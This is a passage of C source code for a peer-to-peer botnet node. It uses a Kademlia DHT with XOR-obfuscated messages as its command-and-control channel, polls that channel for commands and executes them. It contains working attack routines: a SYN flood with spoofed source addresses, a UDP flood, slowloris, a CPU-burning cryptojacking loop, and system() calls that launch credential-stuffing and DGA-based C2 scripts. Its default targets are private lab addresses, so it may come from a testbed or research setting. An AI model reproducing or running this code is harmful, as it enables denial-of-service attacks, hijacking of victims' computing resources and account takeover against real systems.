    int nc=0;Contact *init=routing_find_closest(&n->routing,key,K,&nc);if(!init)return 0;
    Contact closest[K*2];int n_cl=(nc<K*2)?nc:K*2;memcpy(closest,init,n_cl*sizeof(Contact));free(init);
    uint8_t queried[BUCKET_COUNT*K][ID_BYTES];int nq=0;
    char collected[QUORUM][MAX_VALUE_LEN];int n_col=0;
    Contact non_holders[K*4];int n_nh=0;

    for(int iter=0;iter<MAX_ITER;iter++){
        FindValueTask tasks[ALPHA];pthread_t threads[ALPHA];int qc=0;
        for(int i=0;i<n_cl&&qc<ALPHA;i++){
            if(!id_in_set(closest[i].id,queried,nq)){
                tasks[qc].n=n;tasks[qc].dst_ip=closest[i].ip;tasks[qc].dst_port=closest[i].port;
                memcpy(tasks[qc].key,key,ID_BYTES);
                if(nq<BUCKET_COUNT*K)memcpy(queried[nq++],closest[i].id,ID_BYTES);qc++;
            }
        }
        if(qc==0)break;
        for(int i=0;i<qc;i++)pthread_create(&threads[i],NULL,find_value_worker,&tasks[i]);
        for(int i=0;i<qc;i++)pthread_join(threads[i],NULL);
        for(int i=0;i<qc;i++){
            if(tasks[i].found&&n_col<QUORUM)strncpy(collected[n_col++],tasks[i].found_val,MAX_VALUE_LEN-1);
            else if(!tasks[i].found){
                if(n_nh<(int)(sizeof(non_holders)/sizeof(non_holders[0]))){
                    Contact c;memcpy(c.id,queried[nq-qc+i],ID_BYTES);
                    c.ip=tasks[i].dst_ip;c.port=tasks[i].dst_port;c.server_mode=1;
                    non_holders[n_nh++]=c;
                }
                for(int j=0;j<tasks[i].n_closer;j++){
                    Contact *nc2=&tasks[i].closer[j];routing_add(&n->routing,nc2,n);
                    if(!id_in_contacts(nc2->id,closest,n_cl)&&n_cl<K*2)closest[n_cl++]=*nc2;
                }
            }
        }
        if(n_col>=QUORUM)break;
        contacts_sort(closest,n_cl,key);if(n_cl>K)n_cl=K;
    }
    if(n_col==0)return 0;

    const char *cands[QUORUM];for(int i=0;i<n_col;i++)cands[i]=collected[i];
    int bi=g_select(key,cands,n_col);if(bi<0||bi>=n_col)bi=0;
    int copy=(int)strlen(cands[bi]);if(copy>vmax-1)copy=vmax-1;
    memcpy(vout,cands[bi],copy);vout[copy]='\0';

    /* entry correction */
    for(int i=0;i<n_nh&&i<K;i++)kademlia_store_rpc(n,non_holders[i].ip,non_holders[i].port,key,vout,copy);

    /* lookup-path caching: store at closest non-holding path node */
    if(n_nh>0){
        int cn=0;for(int i=1;i<n_nh;i++)if(xor_cmp(key,non_holders[i].id,non_holders[cn].id)<0)cn=i;
        kademlia_store_rpc(n,non_holders[cn].ip,non_holders[cn].port,key,vout,copy);
    }
    return 1;
}

static int store_value(KademliaNode *n,const uint8_t *key,const char *value,int vlen,int is_orig){
    if(!g_validate(key,value))return 0;
    kvstore_put(&n->store,key,value,vlen,is_orig);
    if(is_orig){
        pthread_mutex_lock(&n->orig_keys_lock);
        int found=0;for(int i=0;i<n->orig_key_count;i++)if(memcmp(n->orig_keys[i],key,ID_BYTES)==0){found=1;break;}
        if(!found&&n->orig_key_count<MAX_KV_ENTRIES)memcpy(n->orig_keys[n->orig_key_count++],key,ID_BYTES);
        pthread_mutex_unlock(&n->orig_keys_lock);
    }
    Contact recip[K];int nr=iterative_find_node(n,key,recip,K);
    int acks=0;for(int i=0;i<nr;i++)if(kademlia_store_rpc(n,recip[i].ip,recip[i].port,key,value,vlen))acks++;
    printf("[P2P] Stored value on %d/%d nodes\n",acks,nr);return acks;
}

static int add_provider(KademliaNode *n,const uint8_t *key){
    Contact recip[K];int nr=iterative_find_node(n,key,recip,K);
    int acks=0;for(int i=0;i<nr;i++)if(kademlia_add_provider_rpc(n,recip[i].ip,recip[i].port,key))acks++;
    printf("[P2P] add_provider: announced on %d/%d nodes\n",acks,nr);return acks;
}

/* ── Handle incoming ────────────────────────────────────────────────── */
static void handle_incoming(KademliaNode *n,const uint8_t *buf,int len){
    if(len<HDR_SIZE)return;
    uint8_t type,mid[8];NodeID sid;uint32_t sip;uint16_t sport;
    decode_header(buf,&type,mid,sid,&sip,&sport);
    Contact c;memcpy(c.id,sid,ID_BYTES);c.ip=sip;c.port=sport;
    c.last_seen=time(NULL);c.fail_count=0;c.server_mode=1;
    routing_add(&n->routing,&c,n);
    const uint8_t *pl=buf+HDR_SIZE;int plen=len-HDR_SIZE;

    if(type==MSG_PING){
        uint8_t resp[HDR_SIZE];encode_header(resp,MSG_PONG,mid,n->self_id,n->self_ip,n->self_port);
        send_msg(n->sock,resp,HDR_SIZE,sip,sport);
    } else if(type==MSG_FIND_NODE&&plen>=ID_BYTES){
        NodeID target;memcpy(target,pl,ID_BYTES);int nf=0;
        Contact *found=routing_find_closest(&n->routing,target,K,&nf);
        int rs=HDR_SIZE+1+nf*CONTACT_SIZE;uint8_t *resp=malloc(rs);if(!resp){free(found);return;}
        encode_header(resp,MSG_FOUND_NODES,mid,n->self_id,n->self_ip,n->self_port);resp[HDR_SIZE]=(uint8_t)nf;
        for(int i=0;i<nf;i++){uint8_t *e=resp+HDR_SIZE+1+i*CONTACT_SIZE;memcpy(e,found[i].id,ID_BYTES);memcpy(e+ID_BYTES,&found[i].ip,4);memcpy(e+ID_BYTES+4,&found[i].port,2);}
        send_msg(n->sock,resp,rs,sip,sport);free(resp);free(found);
    } else if(type==MSG_STORE&&plen>=ID_BYTES+2){
        uint8_t key[ID_BYTES];memcpy(key,pl,ID_BYTES);uint16_t vln;memcpy(&vln,pl+ID_BYTES,2);int vl=(int)ntohs(vln);
        if(plen>=ID_BYTES+2+vl)kvstore_put(&n->store,key,(const char*)(pl+ID_BYTES+2),vl,0);
        uint8_t resp[HDR_SIZE];encode_header(resp,MSG_PONG,mid,n->self_id,n->self_ip,n->self_port);
        send_msg(n->sock,resp,HDR_SIZE,sip,sport);
    } else if(type==MSG_FIND_VALUE&&plen>=ID_BYTES){
        uint8_t key[ID_BYTES];memcpy(key,pl,ID_BYTES);char value[MAX_VALUE_LEN];
        int vlen=kvstore_get(&n->store,key,value,MAX_VALUE_LEN);
        if(vlen>0){
            uint16_t vln=htons((uint16_t)vlen);int rs=HDR_SIZE+ID_BYTES+2+vlen;uint8_t *resp=malloc(rs);if(!resp)return;
            int off=encode_header(resp,MSG_FOUND_VALUE,mid,n->self_id,n->self_ip,n->self_port);
            memcpy(resp+off,key,ID_BYTES);off+=ID_BYTES;memcpy(resp+off,&vln,2);off+=2;memcpy(resp+off,value,vlen);
            send_msg(n->sock,resp,rs,sip,sport);free(resp);
        } else {
            int nf=0;Contact *found=routing_find_closest(&n->routing,key,K,&nf);
            int rs=HDR_SIZE+1+nf*CONTACT_SIZE;uint8_t *resp=malloc(rs);if(!resp){free(found);return;}
            encode_header(resp,MSG_FOUND_NODES,mid,n->self_id,n->self_ip,n->self_port);resp[HDR_SIZE]=(uint8_t)nf;
            for(int i=0;i<nf;i++){uint8_t *e=resp+HDR_SIZE+1+i*CONTACT_SIZE;memcpy(e,found[i].id,ID_BYTES);memcpy(e+ID_BYTES,&found[i].ip,4);memcpy(e+ID_BYTES+4,&found[i].port,2);}
            send_msg(n->sock,resp,rs,sip,sport);free(resp);free(found);
        }
    } else if(type==MSG_ADD_PROVIDER&&plen>=ID_BYTES){
        uint8_t key[ID_BYTES];memcpy(key,pl,ID_BYTES);pstore_add(&n->pstore,key,&c);
        uint8_t resp[HDR_SIZE];encode_header(resp,MSG_PONG,mid,n->self_id,n->self_ip,n->self_port);
        send_msg(n->sock,resp,HDR_SIZE,sip,sport);
    } else if(type==MSG_GET_PROVIDERS&&plen>=ID_BYTES){
        uint8_t key[ID_BYTES];memcpy(key,pl,ID_BYTES);
        Contact prov[MAX_PROVIDERS_PER_KEY];int np=pstore_get(&n->pstore,key,prov,MAX_PROVIDERS_PER_KEY);
        int nf=0;Contact *found=routing_find_closest(&n->routing,key,K,&nf);
        int rs=HDR_SIZE+1+np*CONTACT_SIZE+1+nf*CONTACT_SIZE;uint8_t *resp=malloc(rs);if(!resp){free(found);return;}
        int off=encode_header(resp,MSG_PROVIDER_PEERS,mid,n->self_id,n->self_ip,n->self_port);
        resp[off++]=(uint8_t)np;
        for(int i=0;i<np;i++){uint8_t *e=resp+off;off+=CONTACT_SIZE;memcpy(e,prov[i].id,ID_BYTES);memcpy(e+ID_BYTES,&prov[i].ip,4);memcpy(e+ID_BYTES+4,&prov[i].port,2);}
        resp[off++]=(uint8_t)nf;
        for(int i=0;i<nf;i++){uint8_t *e=resp+off;off+=CONTACT_SIZE;memcpy(e,found[i].id,ID_BYTES);memcpy(e+ID_BYTES,&found[i].ip,4);memcpy(e+ID_BYTES+4,&found[i].port,2);}
        send_msg(n->sock,resp,rs,sip,sport);free(resp);free(found);
    } else if(type==MSG_STOP_ALL){
        printf("[P2P] STOP_ALL received\n");
        if(n){pthread_mutex_lock(&n->attack_lock);for(int i=0;i<MAX_ATTACKS;i++)if(n->attacks[i].active&&n->attacks[i].args)n->attacks[i].args->stop=1;pthread_mutex_unlock(&n->attack_lock);}
    } else if(type==MSG_SHUTDOWN){
        printf("[P2P] SHUTDOWN received\n");
        if(n){pthread_mutex_lock(&n->attack_lock);for(int i=0;i<MAX_ATTACKS;i++)if(n->attacks[i].active&&n->attacks[i].args)n->attacks[i].args->stop=1;pthread_mutex_unlock(&n->attack_lock);n->running=0;}
    }
}

/* ── Receive loop ───────────────────────────────────────────────────── */
static void *recv_loop(void *arg){
    KademliaNode *n=arg;uint8_t enc[UDP_BUF],dec[UDP_BUF];
    struct sockaddr_in src;socklen_t sl=sizeof(src);
    while(n->running){
        int r=(int)recvfrom(n->sock,enc,UDP_BUF,0,(struct sockaddr*)&src,&sl);
        if(r<=0||r>(int)UDP_BUF)continue;
        xor_cipher(enc,dec,r);if(r<HDR_SIZE)continue;
        uint8_t mid[8];memcpy(mid,dec+1,8);int matched=0;
        pthread_mutex_lock(&n->pending_lock);
        for(PendingRPC *p=n->pending_head;p;p=p->next){
            if(memcmp(p->msg_id,mid,8)==0){
                pthread_mutex_lock(&p->lock);memcpy(p->response_buf,dec,r);p->response_len=r;p->done=1;
                pthread_cond_signal(&p->cond);pthread_mutex_unlock(&p->lock);matched=1;break;
            }
        }
        pthread_mutex_unlock(&n->pending_lock);
        if(!matched)handle_incoming(n,dec,r);
    }
    return NULL;
}

/* ── Attack implementations ─────────────────────────────────────────── */
struct pseudo_hdr{uint32_t src,dst;uint8_t zero,proto;uint16_t tcp_len;};
static uint16_t tcp_cksum(struct iphdr *iph,struct tcphdr *tcph){
    struct pseudo_hdr ph;ph.src=iph->saddr;ph.dst=iph->daddr;ph.zero=0;ph.proto=IPPROTO_TCP;ph.tcp_len=htons(sizeof(struct tcphdr));
    uint8_t buf[sizeof(ph)+sizeof(struct tcphdr)];memcpy(buf,&ph,sizeof(ph));memcpy(buf+sizeof(ph),tcph,sizeof(struct tcphdr));
    return inet_cksum(buf,sizeof(buf));
}

static void *syn_flood_thread(void *arg){
    AttackArgs *a=arg;int sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);if(sock<0){perror("[ATTACK] SYN: raw socket");return NULL;}
    int one=1;setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&one,sizeof(one));
    struct sockaddr_in dst={0};dst.sin_family=AF_INET;dst.sin_addr.s_addr=inet_addr(a->target);dst.sin_port=htons(a->port);
    uint8_t pkt[sizeof(struct iphdr)+sizeof(struct tcphdr)];
    struct iphdr *iph=(struct iphdr*)pkt;struct tcphdr *tcph=(struct tcphdr*)(pkt+sizeof(struct iphdr));
    time_t end=time(NULL)+a->duration;long count=0;
    printf("[ATTACK] SYN FLOOD -> %s:%d  dur=%ds\n",a->target,a->port,a->duration);
    while(time(NULL)<end&&!a->stop){
        uint32_t sip=htonl((uint32_t)(10+(rand()%220))<<24|(uint32_t)(rand()%256)<<16|(uint32_t)(rand()%256)<<8|(uint32_t)(1+rand()%254));
        memset(pkt,0,sizeof(pkt));iph->ihl=5;iph->version=4;iph->tot_len=htons(sizeof(pkt));iph->id=htons((uint16_t)rand());iph->ttl=64+rand()%64;iph->protocol=IPPROTO_TCP;iph->saddr=sip;iph->daddr=dst.sin_addr.s_addr;iph->check=inet_cksum(iph,sizeof(struct iphdr));
        tcph->source=htons(1024+rand()%64511);tcph->dest=htons(a->port);tcph->seq=htonl((uint32_t)rand());tcph->doff=5;tcph->syn=1;tcph->window=htons(65535);tcph->check=tcp_cksum(iph,tcph);
        sendto(sock,pkt,sizeof(pkt),0,(struct sockaddr*)&dst,sizeof(dst));count++;
    }
    close(sock);printf("[ATTACK] SYN FLOOD done. Packets: %ld\n",count);return NULL;
}

static void *udp_flood_thread(void *arg){
    AttackArgs *a=arg;int sock=socket(AF_INET,SOCK_DGRAM,0);if(sock<0){perror("[ATTACK] UDP");return NULL;}
    uint8_t payload[1024];memset(payload,0,sizeof(payload));
    struct sockaddr_in dst={0};dst.sin_family=AF_INET;dst.sin_addr.s_addr=inet_addr(a->target);
    time_t end=time(NULL)+a->duration;long count=0;
    printf("[ATTACK] UDP FLOOD -> %s  dur=%ds\n",a->target,a->duration);
    while(time(NULL)<end&&!a->stop){dst.sin_port=htons(1+rand()%65534);sendto(sock,payload,sizeof(payload),0,(struct sockaddr*)&dst,sizeof(dst));count++;}
    close(sock);printf("[ATTACK] UDP FLOOD done. Packets: %ld\n",count);return NULL;
}

static void *slowloris_thread(void *arg){
    AttackArgs *a=arg;printf("[ATTACK] SLOWLORIS -> %s:%d  dur=%ds\n",a->target,a->port,a->duration);
    int fds[SLOWLORIS_SOCKS];int n_open=0;
    struct sockaddr_in dst={0};dst.sin_family=AF_INET;dst.sin_addr.s_addr=inet_addr(a->target);dst.sin_port=htons(a->port);
    for(int i=0;i<SLOWLORIS_SOCKS&&!a->stop;i++){
        int s=socket(AF_INET,SOCK_STREAM,0);if(s<0)continue;
        struct timeval tv={4,0};setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
        if(connect(s,(struct sockaddr*)&dst,sizeof(dst))<0){close(s);continue;}
        char req[128];snprintf(req,sizeof(req),"GET /?%d HTTP/1.1\r\nHost: %s\r\n",rand()%9999,a->target);
        send(s,req,strlen(req),0);fds[n_open++]=s;
    }
    time_t end=time(NULL)+a->duration;
    while(time(NULL)<end&&!a->stop){
        for(int i=0;i<n_open;i++){char hdr[64];snprintf(hdr,sizeof(hdr),"X-a: %d\r\n",rand()%5000);if(send(fds[i],hdr,strlen(hdr),0)<0){close(fds[i]);fds[i]=fds[--n_open];i--;}}
        for(int fill=n_open;fill<SLOWLORIS_SOCKS&&!a->stop;fill++){
            int s=socket(AF_INET,SOCK_STREAM,0);if(s<0)break;
            struct timeval tv={4,0};setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));setsockopt(s,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
            if(connect(s,(struct sockaddr*)&dst,sizeof(dst))<0){close(s);continue;}
            char req[128];snprintf(req,sizeof(req),"GET /?%d HTTP/1.1\r\nHost: %s\r\n",rand()%9999,a->target);
            send(s,req,strlen(req),0);fds[n_open++]=s;
        }
        sleep(10);
    }
    for(int i=0;i<n_open;i++)close(fds[i]);printf("[ATTACK] SLOWLORIS done.\n");return NULL;
}

static void *cryptojack_thread(void *arg){
    AttackArgs *a=arg;printf("[ATTACK] CRYPTOJACK  cpu=%.0f%%  dur=%ds\n",a->cpu*100.0,a->duration);
    time_t end=time(NULL)+a->duration;uint8_t state[SHA256_DIGEST_LENGTH];SHA256((const uint8_t*)"init",4,state);
    while(time(NULL)<end&&!a->stop){
        struct timespec we;clock_gettime(CLOCK_MONOTONIC,&we);we.tv_nsec+=(long)(a->cpu*100000000L);
        if(we.tv_nsec>=1000000000L){we.tv_sec++;we.tv_nsec-=1000000000L;}
        struct timespec now;do{SHA256(state,SHA256_DIGEST_LENGTH,state);clock_gettime(CLOCK_MONOTONIC,&now);}
        while(now.tv_sec<we.tv_sec||(now.tv_sec==we.tv_sec&&now.tv_nsec<we.tv_nsec));
        struct timespec sl={0,(long)((1.0-a->cpu)*100000000L)};nanosleep(&sl,NULL);
    }
    printf("[ATTACK] CRYPTOJACK done.\n");return NULL;
}

static void launch_attack(KademliaNode *n,const char *type,void*(*fn)(void*),AttackArgs *args){
    pthread_mutex_lock(&n->attack_lock);
    for(int i=0;i<MAX_ATTACKS;i++)if(n->attacks[i].active&&strcmp(n->attacks[i].type,type)==0){n->attacks[i].args->stop=1;pthread_detach(n->attacks[i].tid);n->attacks[i].active=0;break;}
    for(int i=0;i<MAX_ATTACKS;i++){
        if(!n->attacks[i].active){strncpy(n->attacks[i].type,type,31);n->attacks[i].args=args;n->attacks[i].active=1;pthread_create(&n->attacks[i].tid,NULL,fn,args);printf("[ATTACK] Launched: %s\n",type);pthread_mutex_unlock(&n->attack_lock);return;}
    }
    pthread_mutex_unlock(&n->attack_lock);free(args);
}

static void stop_all_attacks(KademliaNode *n){
    pthread_mutex_lock(&n->attack_lock);
    for(int i=0;i<MAX_ATTACKS;i++)if(n->attacks[i].active){n->attacks[i].args->stop=1;pthread_detach(n->attacks[i].tid);n->attacks[i].active=0;}
    pthread_mutex_unlock(&n->attack_lock);printf("[ATTACK] All attacks stopped.\n");
}

/* ── JSON helpers ───────────────────────────────────────────────────── */
static int json_str(const char *j,const char *f,char *out,int ol){
    char s[64];snprintf(s,sizeof(s),"\"%s\"",f);const char *p=strstr(j,s);if(!p)return 0;
    p=strchr(p+strlen(s),'"');if(!p)return 0;p++;int l=0;while(*p&&*p!='"'&&l<ol-1)out[l++]=*p++;out[l]='\0';return l;
}
static int json_int(const char *j,const char *f,int def){
    char s[64];snprintf(s,sizeof(s),"\"%s\"",f);const char *p=strstr(j,s);if(!p)return def;
    p=strchr(p+strlen(s),':');if(!p)return def;while(*p==':'||*p==' ')p++;if(*p=='"')p++;return atoi(p);
}
static double json_float(const char *j,const char *f,double def){
    char s[64];snprintf(s,sizeof(s),"\"%s\"",f);const char *p=strstr(j,s);if(!p)return def;
    p=strchr(p+strlen(s),':');if(!p)return def;while(*p==':'||*p==' ')p++;return atof(p);
}

static void execute_command(KademliaNode *n,const char *cmd_json){
    char type[32]={0};json_str(cmd_json,"type",type,sizeof(type));
    printf("\n[P2P] *** COMMAND RECEIVED from DHT ***\n[P2P] Type: %s\n[P2P] Payload: %.200s\n",type,cmd_json);
    if(strcmp(type,"syn_flood")==0){
        AttackArgs *a=calloc(1,sizeof(AttackArgs));if(!a)return;
        json_str(cmd_json,"target",a->target,sizeof(a->target));if(!a->target[0])strcpy(a->target,"192.168.100.20");
        a->port=json_int(cmd_json,"port",80);a->duration=json_int(cmd_json,"duration",30);
        launch_attack(n,"syn_flood",syn_flood_thread,a);
    } else if(strcmp(type,"udp_flood")==0){
        AttackArgs *a=calloc(1,sizeof(AttackArgs));if(!a)return;
        json_str(cmd_json,"target",a->target,sizeof(a->target));if(!a->target[0])strcpy(a->target,"192.168.100.20");
        a->duration=json_int(cmd_json,"duration",30);launch_attack(n,"udp_flood",udp_flood_thread,a);
    } else if(strcmp(type,"slowloris")==0){
        AttackArgs *a=calloc(1,sizeof(AttackArgs));if(!a)return;
        json_str(cmd_json,"target",a->target,sizeof(a->target));if(!a->target[0])strcpy(a->target,"192.168.100.20");
        a->port=json_int(cmd_json,"port",80);a->duration=json_int(cmd_json,"duration",60);
        launch_attack(n,"slowloris",slowloris_thread,a);
    } else if(strcmp(type,"cryptojack")==0){
        AttackArgs *a=calloc(1,sizeof(AttackArgs));if(!a)return;
        a->duration=json_int(cmd_json,"duration",120);a->cpu=json_float(cmd_json,"cpu",0.25);
        if(a->cpu<=0.0||a->cpu>1.0)a->cpu=0.25;launch_attack(n,"cryptojack",cryptojack_thread,a);
    } else if(strcmp(type,"cred_stuffing")==0){
        char target[64]="192.168.100.20",mode[32]="jitter";int port=80,duration=120,jitter=200,workers=3;
        json_str(cmd_json,"target",target,sizeof(target));json_str(cmd_json,"mode",mode,sizeof(mode));
        port=json_int(cmd_json,"port",port);duration=json_int(cmd_json,"duration",duration);
        jitter=json_int(cmd_json,"jitter",jitter);workers=json_int(cmd_json,"workers",workers);
        char cmd[512];
        if(strcmp(mode,"distributed")==0)snprintf(cmd,sizeof(cmd),"python3 cred_stuffing.py --mode distributed --host %s --port %d --workers %d &",target,port,workers);
        else snprintf(cmd,sizeof(cmd),"python3 cred_stuffing.py --mode %s --host %s --port %d --interval 500 --jitter %d &",mode,target,port,jitter);
        printf("[P2P] Spawning: %s\n",cmd);system(cmd);
    } else if(strcmp(type,"stop_all")==0){stop_all_attacks(n);
    } else if(strcmp(type,"shutdown")==0){stop_all_attacks(n);n->running=0;
    } else if(strcmp(type,"idle")==0){printf("[P2P] -> Idle\n");
    } else if(strcmp(type,"dga_search")==0){printf("[P2P] -> Triggering DGA C2 search\n");system("python3 dga.py &");
    } else if(strcmp(type,"update_secret")==0){
        char ns[64]={0};json_str(cmd_json,"secret",ns,sizeof(ns));
        if(strlen(ns)>=8){rotate_p2p_key(ns);printf("[P2P] -> P2P mesh key rotated. New keystream: %02x%02x%02x%02x...\n",g_key_hash[0],g_key_hash[1],g_key_hash[2],g_key_hash[3]);}
        else printf("[P2P] -> update_secret ignored: secret must be >=8 chars\n");
    } else {printf("[P2P] -> Unknown command type: %s\n",type);}
}

static int dedup_seen(KademliaNode *n,const char *value){
    uint8_t hash[ID_BYTES];SHA1((const uint8_t*)value,strlen(value),hash);
    pthread_mutex_lock(&n->exec_lock);
    int count=(n->exec_count<EXEC_HISTORY)?n->exec_count:EXEC_HISTORY;
    for(int i=0;i<count;i++){int slot=(n->exec_count-1-i)%EXEC_HISTORY;if(memcmp(n->exec_hashes[slot],hash,ID_BYTES)==0){pthread_mutex_unlock(&n->exec_lock);return 1;}}
    memcpy(n->exec_hashes[n->exec_count%EXEC_HISTORY],hash,ID_BYTES);n->exec_count++;
    pthread_mutex_unlock(&n->exec_lock);return 0;
}

/* ── Background threads ─────────────────────────────────────────────── */
static void *command_poll_thread(void *arg){
    KademliaNode *n=arg;uint8_t cmd_key[ID_BYTES];sha1_str(COMMAND_KEY,cmd_key);
    while(n->running){for(int i=0;i<POLL_SEC&&n->running;i++)sleep(1);if(!n->running)break;
        char value[MAX_VALUE_LEN];if(iterative_find_value(n,cmd_key,value,MAX_VALUE_LEN))if(!dedup_seen(n,value))execute_command(n,value);}
    return NULL;
}

static void *bucket_refresh_thread(void *arg){
    KademliaNode *n=arg;printf("[P2P] Refresh thread started (check every %ds, stale after %ds)\n",REFRESH_SEC,BUCKET_TTL_SEC);
    while(n->running){for(int i=0;i<REFRESH_SEC&&n->running;i++)sleep(1);if(!n->running)break;
        int stale=0;time_t now=time(NULL);
        for(int i=0;i<BUCKET_COUNT;i++){
            KBucket *b=&n->routing.buckets[i];pthread_mutex_lock(&b->lock);
            int ne=(b->count>0),is=(now-b->last_touched)>BUCKET_TTL_SEC;pthread_mutex_unlock(&b->lock);
            if(!ne||!is)continue;
            NodeID rt;memcpy(rt,n->self_id,ID_BYTES);rt[ID_BYTES-1-i/8]^=(uint8_t)(1<<(i%8));
            Contact tmp[K];int got=iterative_find_node(n,rt,tmp,K);
            for(int j=0;j<got;j++)routing_add(&n->routing,&tmp[j],n);
            pthread_mutex_lock(&b->lock);b->last_touched=time(NULL);pthread_mutex_unlock(&b->lock);stale++;
        }
        if(stale)printf("[P2P] Refreshed %d stale bucket(s)\n",stale);}
    return NULL;
}

static void *replicate_thread(void *arg){
    KademliaNode *n=arg;
    while(n->running){for(int i=0;i<REPLICATE_SEC&&n->running;i++)sleep(1);if(!n->running)break;
        printf("[P2P] Replicating locally stored values...\n");
        pthread_mutex_lock(&n->store.lock);KVEntry snap[MAX_KV_ENTRIES];int sc=0;time_t now=time(NULL);
        for(int i=0;i<MAX_KV_ENTRIES;i++)if(n->store.entries[i].used&&(now-n->store.entries[i].stored_at)<(time_t)n->store.entries[i].ttl)snap[sc++]=n->store.entries[i];
        pthread_mutex_unlock(&n->store.lock);
        for(int i=0;i<sc;i++){Contact recip[K];int nr=iterative_find_node(n,snap[i].key,recip,K);int acks=0;for(int j=0;j<nr;j++)if(kademlia_store_rpc(n,recip[j].ip,recip[j].port,snap[i].key,snap[i].value,snap[i].value_len))acks++;printf("[P2P] Replicated key on %d nodes\n",acks);}
    }
    return NULL;
}

static void *republish_thread(void *arg){
    KademliaNode *n=arg;printf("[P2P] Republish thread started (interval: %ds)\n",REPUBLISH_SEC);
    while(n->running){for(int i=0;i<REPUBLISH_SEC&&n->running;i++)sleep(1);if(!n->running)break;
        pthread_mutex_lock(&n->orig_keys_lock);uint8_t keys[MAX_KV_ENTRIES][ID_BYTES];int nk=n->orig_key_count;memcpy(keys,n->orig_keys,nk*sizeof(keys[0]));pthread_mutex_unlock(&n->orig_keys_lock);
        printf("[P2P] Republishing %d original key(s)...\n",nk);int rep=0;
        for(int i=0;i<nk;i++){char value[MAX_VALUE_LEN];int vl=kvstore_get(&n->store,keys[i],value,MAX_VALUE_LEN);if(vl<=0)continue;
            Contact recip[K];int nr=iterative_find_node(n,keys[i],recip,K);for(int j=0;j<nr;j++)kademlia_store_rpc(n,recip[j].ip,recip[j].port,keys[i],value,vl);
            kvstore_put(&n->store,keys[i],value,vl,1);rep++;}
        printf("[P2P] Republished %d key(s)\n",rep);}
    return NULL;
}

static void *expiry_loop(void *arg){
    KademliaNode *n=arg;printf("[P2P] Expiry thread started (interval: %ds)\n",EXPIRY_CHECK_SEC);
    while(n->running){for(int i=0;i<EXPIRY_CHECK_SEC&&n->running;i++)sleep(1);if(!n->running)break;
        int expired=kvstore_expire(&n->store);if(expired)printf("[P2P] Expired %d stale KV entries\n",expired);}
    return NULL;
}

static void *periodic_bootstrap_thread(void *arg){
    KademliaNode *n=arg;printf("[P2P] Periodic bootstrap thread started (interval: %ds)\n",BOOTSTRAP_SEC);
    while(n->running){for(int i=0;i<BOOTSTRAP_SEC&&n->running;i++)sleep(1);if(!n->running)break;
        printf("[P2P] Periodic bootstrap: running self-lookup...\n");
        Contact found[K];int nf=iterative_find_node(n,n->self_id,found,K);for(int i=0;i<nf;i++)routing_add(&n->routing,&found[i],n);
        int total=0;for(int i=0;i<BUCKET_COUNT;i++)total+=n->routing.buckets[i].count;
        printf("[P2P] Periodic bootstrap done. %d peers.\n",total);}
    return NULL;
}

static void *status_thread(void *arg){
    KademliaNode *n=arg;
    while(n->running){for(int i=0;i<STATUS_SEC&&n->running;i++)sleep(1);if(!n->running)break;
        int total=0,kv_live=0,kv_all=0,aa=0;time_t now=time(NULL);
        for(int i=0;i<BUCKET_COUNT;i++)total+=n->routing.buckets[i].count;
        pthread_mutex_lock(&n->store.lock);for(int i=0;i<MAX_KV_ENTRIES;i++){if(n->store.entries[i].used){kv_all++;if((now-n->store.entries[i].stored_at)<(time_t)n->store.entries[i].ttl)kv_live++;}}pthread_mutex_unlock(&n->store.lock);
        pthread_mutex_lock(&n->attack_lock);for(int i=0;i<MAX_ATTACKS;i++)if(n->attacks[i].active)aa++;pthread_mutex_unlock(&n->attack_lock);
        char id_hex[ID_BYTES*2+1];for(int i=0;i<ID_BYTES;i++)sprintf(id_hex+i*2,"%02x",n->self_id[i]);
        printf("\n[P2P] -- Status --\n[P2P]  Mode     : %s\n[P2P]  Node ID  : %.16s...\n[P2P]  Peers    : %d\n[P2P]  KV keys  : %d live / %d total\n[P2P]  Attacks  : %d active\n[P2P]  Commands : %d executed\n\n",
               n->server_mode?"server":"client",id_hex,total,kv_live,kv_all,aa,n->exec_count);}
    return NULL;
}

/* ── Bootstrap ──────────────────────────────────────────────────────── */
static void bootstrap_from(KademliaNode *n,const char *seed_host,uint16_t seed_port_nbo){
    printf("[P2P] Bootstrapping from %s:%u\n",seed_host,(unsigned)ntohs(seed_port_nbo));
    struct in_addr addr;if(resolve_host(seed_host,&addr)<0){printf("[P2P] Cannot resolve %s\n",seed_host);return;}
    Contact seed;id_from_host_port(seed_host,seed_port_nbo,seed.id);seed.ip=addr.s_addr;seed.port=seed_port_nbo;seed.last_seen=time(NULL);seed.fail_count=0;seed.server_mode=1;
    if(kademlia_ping(n,seed.ip,seed.port)){routing_add(&n->routing,&seed,n);printf("[P2P] Seed reachable\n");}
    else{printf("[P2P] Seed unreachable -- skipping\n");return;}
    Contact found[K];int nf=iterative_find_node(n,n->self_id,found,K);for(int i=0;i<nf;i++)routing_add(&n->routing,&found[i],n);
    printf("[P2P] Bootstrap from %s: %d peers discovered\n",seed_host,nf);
}

/* ── Node init / start / stop ───────────────────────────────────────── */
static int node_init(KademliaNode *n,const char *host,uint16_t port_nbo,int server_mode){
    memset(n,0,sizeof(*n));
    struct in_addr addr;if(resolve_host(host,&addr)<0){perror("resolve_host");return -1;}
    n->self_ip=addr.s_addr;n->self_port=port_nbo;n->server_mode=server_mode;
    id_from_host_port(host,port_nbo,n->self_id);
    printf("[P2P] Node ID: ");for(int i=0;i<ID_BYTES;i++)printf("%02x",n->self_id[i]);
    printf("\n[P2P] Listening on %s:%u  mode=%s\n",host,(unsigned)ntohs(port_nbo),server_mode?"server":"client");
    routing_init(&n->routing,n->self_id);kvstore_init(&n->store);pstore_init(&n->pstore);
    pthread_mutex_init(&n->pending_lock,NULL);pthread_mutex_init(&n->exec_lock,NULL);
    pthread_mutex_init(&n->attack_lock,NULL);pthread_mutex_init(&n->orig_keys_lock,NULL);
    n->sock=socket(AF_INET,SOCK_DGRAM,0);if(n->sock<0){perror("socket");return -1;}
    int one=1;setsockopt(n->sock,SOL_SOCKET,SO_REUSEADDR,&one,sizeof(one));
